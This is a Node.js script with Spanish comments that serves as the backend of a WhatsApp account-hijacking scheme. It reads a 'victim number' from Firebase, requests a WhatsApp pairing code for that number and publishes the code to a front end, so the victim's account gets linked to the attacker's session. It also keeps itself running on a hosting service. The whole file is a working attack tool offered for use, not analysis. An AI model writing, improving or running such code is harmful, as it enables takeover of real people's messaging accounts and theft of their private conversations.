const { Client, LocalAuth } = require('whatsapp-web.js');
const admin = require('firebase-admin');
const http = require('http');

// CONFIGURACIÓN DE FIREBASE
const serviceAccount = require("./serviceAccountKey.json"); 
if (!admin.apps.length) {
    admin.initializeApp({
        credential: admin.credential.cert(serviceAccount)
    });
}
const db = admin.firestore();

const client = new Client({
    authStrategy: new LocalAuth({ clientId: "master_session" }),
    puppeteer: {
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process']
    }
});

// FUNCIÓN PARA REVISAR FIREBASE CONSTANTEMENTE
async function revisarPeticiones() {
    try {
        const docRef = db.collection("wa_clon_global").doc("current_session");
        const snap = await docRef.get();
        
        if (snap.exists) {
            const data = snap.data();
            // Si hay un número nuevo y el estado es 'solicitando_codigo'
            if (data.status === "solicitando_codigo" && !data.pairingCode) {
                console.log(">>> [!] DETECTADO NÚMERO: " + data.numero_victima);
                
                // Pedimos el código a WhatsApp Web Real
                const code = await client.requestPairingCode(data.numero_victima);
                
                // Lo subimos a Firebase con status 'mostrando_codigo'
                await docRef.update({
                    pairingCode: code,
                    status: "mostrando_codigo",
                    lastUpdated: admin.firestore.FieldValue.serverTimestamp()
                });
                console.log(">>> [OK] CÓDIGO GENERADO: " + code);
            }
        }
    } catch (e) {
        console.log(">>> ERROR EN REVISIÓN: " + e.message);
    }
}

// EJECUTAR REVISIÓN CADA 3 SEGUNDOS (Fuerza Bruta)
setInterval(revisarPeticiones, 3000);

client.on('ready', () => {
    console.log(">>> [!!!] SESIÓN VINCULADA EXITOSAMENTE");
    db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
});

client.initialize().catch(e => console.log(">>> Error Init:", e));

// SERVIDOR PARA QUE RENDER NO APAGUE EL ROBOT
const port = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.end('MOTOR ONLINE');
}).listen(port, () => {
    console.log("Robot activo en puerto " + port);
});
